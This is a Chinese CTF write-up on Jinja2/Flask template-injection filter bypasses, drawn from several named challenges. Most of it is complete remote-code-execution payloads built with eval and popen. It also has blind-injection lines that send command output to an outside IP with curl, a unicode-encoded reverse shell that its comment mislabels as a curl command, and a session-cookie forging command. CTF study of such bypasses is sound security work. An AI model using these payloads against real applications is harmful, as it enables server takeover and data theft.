| [escape()](https://jinja.palletsprojects.com/en/master/templates/#escape) | [last()](https://jinja.palletsprojects.com/en/master/templates/#last) | [rejectattr()](https://jinja.palletsprojects.com/en/master/templates/#rejectattr) | [striptags()](https://jinja.palletsprojects.com/en/master/templates/#striptags) | [wordcount()](https://jinja.palletsprojects.com/en/master/templates/#wordcount) |
| [filesizeformat()](https://jinja.palletsprojects.com/en/master/templates/#filesizeformat) | [length()](https://jinja.palletsprojects.com/en/master/templates/#length) | [replace()](https://jinja.palletsprojects.com/en/master/templates/#replace) | [sum()](https://jinja.palletsprojects.com/en/master/templates/#sum) | [wordwrap()](https://jinja.palletsprojects.com/en/master/templates/#wordwrap) |
| [first()](https://jinja.palletsprojects.com/en/master/templates/#first) | [list()](https://jinja.palletsprojects.com/en/master/templates/#list) | [reverse()](https://jinja.palletsprojects.com/en/master/templates/#reverse) | [title()](https://jinja.palletsprojects.com/en/master/templates/#title) | [xmlattr()](https://jinja.palletsprojects.com/en/master/templates/#xmlattr) |


[https://jinja.palletsprojects.com/en/master/templates/#builtin-filters](https://jinja.palletsprojects.com/en/master/templates/#builtin-filters)

### 常用字符获取入口点

- 对于获取一般字符的方法有以下几种：

```python
{% set org = ({ }|select()|string()) %}{{org}}
{% set org = (self|string()) %}{{org}}
{% set org = self|string|urlencode %}{{org}}
{% set org = (app.__doc__|string) %}{{org}}
```

如下演示：

```python
{% set org = ({ }|select()|string()) %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364582454-d10435c7-487e-4cbe-8bfc-53bb68e4df29.png#averageHue=%23c5c8ba&id=WFD4O&originHeight=335&originWidth=1273&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们可以通过 <generator object select_or_reject at 0x7fe339298fc0> 字符串获取的字符有：尖号、字母、空格、下划线和数字。

```python
{% set org = (self|string()) %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364582600-cda736a5-c007-4441-8c0e-e1b2e38c717d.png#averageHue=%23bfc0ae&id=qJUWw&originHeight=353&originWidth=1131&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，可以通过  字符串获取的字符有：尖号、字母和空格。

```python
{% set org = self|string|urlencode %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364582709-496cb9ab-813f-4a97-ae4b-8aae7819394c.png#averageHue=%23bdb791&id=bnoL3&originHeight=377&originWidth=1193&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，可以通过  字符串获取的字符有：尖号、字母和空格。

```python
{% set org = self|string|urlencode %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364582821-7be632aa-8814-4c50-82d5-bfc11db1c5f9.png#averageHue=%23fcfbfb&id=s0DUC&originHeight=282&originWidth=1242&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符.

```python
{% set org = (app.__doc__|string) %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364582942-0640c749-1fd4-473a-bfa6-f1c2e5585cdf.png#averageHue=%23dbdcca&id=HPrhm&originHeight=295&originWidth=2452&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

```python
{% set org = (app.__doc__|string) %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583089-74396b81-19aa-4495-880d-9b73ecde4ef6.png#averageHue=%23f5f4f3&id=UTk4W&originHeight=213&originWidth=2462&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，可获得到的字符更多了。

- 对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：

```python
{% set num = (self|int) %}{{num}}    # 0, 通过int过滤器获取数字
{% set num = (self|string|length) %}{{num}}    # 24, 通过length过滤器获取数字
{% set point = self|float|string|min %}    # 通过float过滤器获取点 .
```

有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。

下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。

### [2020 DASCTF 八月安恒月赛]ezflask

题目源码：

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from flask import Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory
app = Flask(__name__)


@app.route("/")
def index():
    def safe_jinja(s):
        blacklist = ['class', 'attr', 'mro', 'base',
                     'request', 'session', '+', 'add', 'chr', 'ord', 'redirect', 'url_for', 'config', 'builtins', 'get_flashed_messages', 'get', 'subclasses', 'form', 'cookies', 'headers', '[', ']', '\'', '"', '{}']
        flag = True
        for no in blacklist:
            if no.lower() in s.lower():
                flag = False
                break
        return flag
    if not request.args.get('name'):
        return open(__file__).read()
    elif safe_jinja(request.args.get('name')):
        name = request.args.get('name')
    else:
        name = 'wendell'
    template = '''

    <div class="center-content">
        <p>Hello, %s</p>
    </div>
    <!--flag in /flag-->
    <!--python3.8-->
''' % (name)
    return render_template_string(template)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

可以看到题目过滤的死死地，最关键是把attr也给过滤了的话，这就很麻烦了，但是我们还可以用过滤器进行绕过。

在存在ssti的地方执行如下payload：

```python
{% set org = ({ }|select()|string()) %}{{org}}
# 或 {% set org = ({ }|select|string) %}{{org}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583187-d00a384c-66c9-4647-86e9-ca9c74f7adb0.png#averageHue=%239aa79c&id=nldt4&originHeight=226&originWidth=1158&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以看到，我们得到了一段字符串：`<generator object select_or_reject at 0x7f06771f4150>`，这段字符串中不仅存在字符，还存在空格、下划线，尖号和数字。也就是说，如果题目过滤了这些字符的话，我们便可以在 `<generator object select_or_reject at 0x7f06771f4150>` 这个字符串中取到我们想要的字符，从而绕过过滤。

然后我们在使用list()过滤器将字符串转化为列表：

```python
{% set orglst = ({ }|select|string|list) %}{{orglst}}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583302-de1236da-081b-4179-a7e0-97eca219e9e0.png#averageHue=%23c1b790&id=X1qmo&originHeight=322&originWidth=2460&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，反回了一个列表，列表中是 <generator object select_or_reject at 0x7f06771f4150> 这个字符串的每一个字符。接下来我们便可以使用使用pop()等方法将列表里的字符取出来了。如下所示，我们取一个下划线 _：

```python
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583429-17e661a0-3c3b-470d-8d7e-bc522837601c.png#averageHue=%239fa396&id=QgQbk&originHeight=277&originWidth=1464&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

同理还能取到更多的字符：

```python
{% set space = (({ }|select|string|list).pop(10)|string) %}{{spa}}    # 空格
{% set xhx = (({ }|select|string|list).pop(24)|string) %}{{xhx}}    # _
{% set zero = (({ }|select|string|list).pop(38)|int) %}{{zero}}    # 0
{% set seven = (({ }|select|string|list).pop(40)|int) %}{{seven}}    # 7
```

这里，其实有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算，如下示例：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}{{one}}    # 1
{%set two = (zero-one-one)|abs %}    # 2
{%set three = (zero-one-one-one)|abs %}    # 3
{% set five = (two*two*two)-one-one-one %}    # 5
#  {%set four = (one+three) %}    注意, 这样的加号的是不行的,不知道为什么,只能用减号配合abs取绝对值了
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583525-0d4902e6-d970-42a6-a56b-acc3348adf76.png#averageHue=%238fa392&id=fEHW2&originHeight=168&originWidth=1804&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

通过上述原理，我们可以依次获得构造payload所需的特殊字符与字符串：

```python
# 首先构造出所需的数字:
{% set zero = (({ }|select|string|list).pop(38)|int) %}    # 0
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串:
{% set xhx = (({ }|select|string|list).pop(24)|string) %}    # _
{% set space = (({ }|select|string|list).pop(10)|string) %}    # 空格
{% set point = ((app.__doc__|string|list).pop(26)|string) %}    # .
{% set yin = ((app.__doc__|string|list).pop(195)|string) %}    # 单引号 '
{% set left = ((app.__doc__|string|list).pop(189)|string) %}    # 左括号 (
{% set right = ((app.__doc__|string|list).pop(200)|string) %}    # 右括号 )

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc=bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set os = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx*2~but~xhx*2 %}    # __builtins__
```

将上面构造的字符或字符串拼接起来构造出`__import__('os').popen('cat /flag').read()`：

```python
{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364583622-7fe23d29-24b8-4f0b-82ca-0a3234b3c9cf.png#averageHue=%23bebdbd&id=qNhDE&originHeight=1129&originWidth=2435&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

如上图所示，成功构造出了 **import**('os').popen('cat /flag').read() 。
然后将上面构造的各种变量添加到SSTI万能payload里面就行了：

```python
{% for f,v in whoami.__init__.__globals__.items() %}    # globals
    {% if f == bul %} 
        {% for a,b in v.items() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

所以最终的payload为：

```python
{% set zero = (({ }|select|string|list).pop(38)|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs|int %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set seven = (zero-one-one-five)|abs %}{% set xhx = (({ }|select|string|list).pop(24)|string) %}{% set space = (({ }|select|string|list).pop(10)|string) %}{% set point = ((app.__doc__|string|list).pop(26)|string) %}{% set yin = ((app.__doc__|string|list).pop(195)|string) %}{% set left = ((app.__doc__|string|list).pop(189)|string) %}{% set right = ((app.__doc__|string|list).pop(200)|string) %}{% set c = dict(c=aa)|reverse|first %}{% set bfh=self|string|urlencode|first %}{% set bfhc=bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set os = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx*2~but~xhx*2 %}{% set pld = xhx*2~imp~xhx*2~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in whoami.__init__.__globals__.items() %}{% if f == bul %}{% for a,b in v.items() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

### [2021 MAR & DASCTF]baby_flask

黑名单

```python
blacklist</br>   
'.','[','\'','"','\\','+',':','_',</br>   
'chr','pop','class','base','mro','init','globals','get',</br>   
'eval','exec','os','popen','open','read',</br>   
'select','url_for','get_flashed_messages','config','request',</br>   
'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'</br>
```

Payload构造过程如下：

```python
# 首先构造出所需的数字: 
{% set zero = (self|int) %}    # 0, 也可以使用lenght过滤器获取数字
{% set one = (zero**zero)|int %}    # 1
{% set two = (zero-one-one)|abs %}    # 2
{% set four = (two*two)|int %}    # 4
{% set five = (two*two*two)-one-one-one %}    # 5
{% set three = five-one-one %}    # 3
{% set nine = (two*two*two*two-five-one-one) %}    # 9
{% set seven = (zero-one-one-five)|abs %}    # 7

# 构造出所需的各种字符与字符串: 
{% set space = self|string|min %}    # 空格
{% set point = self|float|string|min %}    # .

{% set c = dict(c=aa)|reverse|first %}    # 字符 c
{% set bfh = self|string|urlencode|first %}    # 百分号 %
{% set bfhc = bfh~c %}    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接
{% set slas = bfhc%((four~seven)|int) %}    # 使用%c构造斜杠 /
{% set yin = bfhc%((three~nine)|int) %}    # 使用%c构造引号 '
{% set xhx = bfhc%((nine~five)|int) %}    # 使用%c构造下划线 _
{% set right = bfhc%((four~one)|int) %}    # 使用%c构造右括号 )
{% set left = bfhc%((four~zero)|int) %}    # 使用%c构造左括号 (

{% set but = dict(buil=aa,tins=dd)|join %}    # builtins
{% set imp = dict(imp=aa,ort=dd)|join %}    # import
{% set pon = dict(po=aa,pen=dd)|join %}    # popen
{% set so = dict(o=aa,s=dd)|join %}    # os
{% set ca = dict(ca=aa,t=dd)|join %}    # cat
{% set flg = dict(fl=aa,ag=dd)|join %}    # flag
{% set ev = dict(ev=aa,al=dd)|join %}    # eval
{% set red = dict(re=aa,ad=dd)|join %}    # read
{% set bul = xhx~xhx~but~xhx~xhx %}    # __builtins__

{% set ini = dict(ini=aa,t=bb)|join %}    # init
{% set glo = dict(glo=aa,bals=bb)|join %}    # globals
{% set itm = dict(ite=aa,ms=bb)|join %}    # items

# 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): 
{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}

# 然后将上面构造的各种变量添加到SSTI万能payload里面就行了: 
{% for f,v in (whoami|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}    # globals
    {% if f == bul %} 
        {% for a,b in (v|attr(itm))() %}    # builtins
            {% if a == ev %}    # eval
                {{b(pld)}}    # eval("__import__('os').popen('cat /flag').read()")
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}

# 最后的payload如下:
{% set zero = (self|int) %}{% set one = (zero**zero)|int %}{% set two = (zero-one-one)|abs %}{% set four = (two*two)|int %}{% set five = (two*two*two)-one-one-one %}{% set three = five-one-one %}{% set nine = (two*two*two*two-five-one-one) %}{% set seven = (zero-one-one-five)|abs %}{% set space = self|string|min %}{% set point = self|float|string|min %}{% set c = dict(c=aa)|reverse|first %}{% set bfh = self|string|urlencode|first %}{% set bfhc = bfh~c %}{% set slas = bfhc%((four~seven)|int) %}{% set yin = bfhc%((three~nine)|int) %}{% set xhx = bfhc%((nine~five)|int) %}{% set right = bfhc%((four~one)|int) %}{% set left = bfhc%((four~zero)|int) %}{% set but = dict(buil=aa,tins=dd)|join %}{% set imp = dict(imp=aa,ort=dd)|join %}{% set pon = dict(po=aa,pen=dd)|join %}{% set so = dict(o=aa,s=dd)|join %}{% set ca = dict(ca=aa,t=dd)|join %}{% set flg = dict(fl=aa,ag=dd)|join %}{% set ev = dict(ev=aa,al=dd)|join %}{% set red = dict(re=aa,ad=dd)|join %}{% set bul = xhx~xhx~but~xhx~xhx %}{% set ini = dict(ini=aa,t=bb)|join %}{% set glo = dict(glo=aa,bals=bb)|join %}{% set itm = dict(ite=aa,ms=bb)|join %}{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %}{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}{% if f == bul %}{% for a,b in (v|attr(itm))() %}{% if a == ev %}{{b(pld)}}{% endif %}{% endfor %}{% endif %}{% endfor %}
```

## 过滤了request和class

这里除了用上面中括号或 |attr() 那几种方法外，我们还可以利用flask里面的session对象和config对象来逃逸这一姿势。

### [NCTF2018]flask真香

过滤

```python
config
class
mro
args
request
open
eval
builtins
import
```

访问到了类，我们就可以通过`__bases__`来获取基类的元组，带上索引0就可以访问到相应的基类。由此一直向上我们就可以访问到最顶层的`object`基类了。**（同样的，如果没有过滤config的话，我们还可以利用config来逃逸，方法与session的相同）**

payload：

```python
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[312].__init__.__globals__['po'+'pen']('cat /Th1s__is_S3cret').read()}}
```

### [NCTF2018]Flask PLUS

过滤

```python
__init__
file
__dict__
__builtins__
__import__
getattr
os
```

这里我们注意到了**enter**方法，查看其内容，发现其竟然有 **globals** 方法可用，也就是说这个**enter**方法与 **init** 方法一模一样。

这里摘抄下一段stack overflow的一段话

- **init** (allocation of the class)
- **enter** (enter context)
- **exit** (leaving context)

因此 **enter** 仅仅访问类的内容，但这已经可以达到我们所需要的目的了。

payload：

```python
{{session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]['__subcla'+'sses__']()[256].__enter__.__globals__['po'+'pen']('cat /Th1s_is__F1114g').read()}}
```

## 魔改字符

在一些题目中能够使用

```python
︷︷config︸︸
｛	&#65371;
｝	&#65373;
［	&#65339;
］	&#65341;
＇	&#65287;
＂	&#65282;
｛｛url_for.__globals__［＇__builtins__＇］［＇eval＇］（＇__import__（＂os＂）.popen（＂cat /flag＂）.read（）＇）｝｝
```

# 没有回显的ssti

```python
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://47.xxx.xxx.72:2333 -d `cat /flag_1s_Hera`') %}1{% endif %}
```

# 题目

## 2022DASCTF7月

[https://www.ctfiot.com/50504.html](https:_www.ctfiot.com_50504)

```python
{%if("".__class__.__bases__[0].__subclasses__()[133].__init__.__globals__["popen"]("curl 47.xxx.xxx.72:2333 -d "`ls /`"").read())%}success{%endif%}  -->>  

{%if(""|attr("__class__")|attr("__bases__")|attr("__getitem__")(0)|attr("__subclasses__")()|attr("__getitem__")(133)|attr("__init__")|attr("__globals__")|attr("__getitem__")("popen")("curl 47.xxx.xxx.72:2333 -d "`ls /`"")|attr("read")())%}success{%endif%}  -->> 

# unicode 编码:

{%if(lipsum|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f")("\u006f\u0073")|attr("\u0070\u006f\u0070\u0065\u006e")("\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0032\u0034\u002e\u0032\u0032\u0032\u002e\u0031\u0037\u0030\u002e\u0032\u0034\u0031\u002f\u0037\u0037\u0037\u0037\u0020\u0030\u003e\u0026\u0031\u0022"))%}test{%endif%}
  # curl 47.xxx.xxx.72:2333 -d "`ls /`"
```

## HITCTF2022

```python
?ha=__class__&hb=__base__&hc=__base__&hd=__subclasses__&he=__init__&hf=__globals__&hg=__builtins__&ah=eval&exp=__import__('app').flag&expression=[][request[dict(a=1,rgs=2)|join][dict(h=1,a=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,b=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,c=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,d=2)|join]]()[191][request[dict(a=1,rgs=2)|join][dict(h=1,e=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,f=2)|join]][request[dict(a=1,rgs=2)|join][dict(h=1,g=2)|join]][request[dict(a=1,rgs=2)|join][dict(a=1,h=2)|join]](request[dict(a=1,rgs=2)|join][dict(e=1,xp=2)|join])
```

## 

## 东北电力大学Cute Cirno

payload模板如下。

```python
{%print(lipsum["__globals__"]["os"]["popen"]("/readflag")["read"]())%}
```

绕过黑名单

```python
{%print(lipsum|attr(({}|select()|trim|list)[24]~({}|select()|trim|list)[24]~
({}|select()|trim|list)[1]~(dict|trim|list)[2]~({}|select()|trim|list)[8]~
({}|select()|trim|list)[12]~(dict|trim|list)[3]~(dict|trim|list)[2]~(dict|trim|list)
[4]~({}|select()|trim|list)[24]~({}|select()|trim|list)
[24])  #__globals__
        
|attr(({}|select()|trim|list)[24]~({}|select()|trim|list)[24]~
({}|select()|trim|list)[1]~({}|select()|trim|list)[2]~(dict|trim|list)[11]~
(dict|trim|list)[9]~(dict|trim|list)[11]~({}|select()|trim|list)[2]~(lipsum|trim|list)
[23]~({}|select()|trim|list)[24]~({}|select()|trim|list)[24])    #__getitem__
        
        
(({}|select()|trim|list)
[8]~(dict|trim|list)[4])   #os
        
|attr((lipsum|trim|list)[26]~({}|select()|trim|list)[8]~
(lipsum|trim|list)[26]~({}|select()|trim|list)[2]~({}|select()|trim|list)[3])  #popen


下面这一串是为了取一个/
((lipsum|attr(({}|select()|trim|list)[24]~({}|select()|trim|list)[24]~
({}|select()|trim|list)[1]~(dict|trim|list)[2]~({}|select()|trim|list)[8]~
({}|select()|trim|list)[12]~(dict|trim|list)[3]~(dict|trim|list)[2]~(dict|trim|list)
[4]~({}|select()|trim|list)[24]~({}|select()|trim|list)[24])|   #__globals__
  

trim()|list())[288]~
({}|select()|trim|list)[5]~({}|select()|trim|list)[2]~(dict|trim|list)[3]~
(dict|trim|list)[8]~({}|select()|trim|list)[41]~(dict|trim|list)[2]~(dict|trim|list)
[3]~({}|select()|trim|list)[1])   #/readflag

        
        |attr(({}|select()|trim|list)[5]~
({}|select()|trim|list)[2]~(dict|trim|list)[3]~(dict|trim|list)[8])())%}
```

第二种打法

```python
python flask_session_cookie_manager3.py encode -s "AgOjocJeHPLnvRequs38qFmgGX334SE9sx72HvAp*NeepuCTF*" -t "{'admin':1,'__globals__':0,'os':0,'popen':0,'/readflag':0,'read':0}"
http://neepusec.fun:28653/genius?answer={%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)
[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%}
```
